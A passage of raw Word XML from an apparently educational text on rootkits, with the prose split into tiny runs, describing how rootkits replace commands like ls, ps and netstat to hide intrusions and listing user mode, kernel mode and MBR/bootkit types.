      </w:r>
      <w:r>
        <w:t>bas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>such</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s,  or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>By  overwr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>iti</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>uch  c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ands,  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">can  be  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">asked </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">from  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7823"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-18"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ypes of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ootk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="77"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>here</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ces where</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>opera</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">So, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>os</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tl</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ype</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>perfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>subvers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>udes:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="3" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>User Mode Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="486" w:right="6750"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Kernel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>ode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="56"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t>3.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>MBR Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>bo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="4" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="74" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>User</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ode roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nvo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>e s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m hook</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">pace. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Whenever</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>an app</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
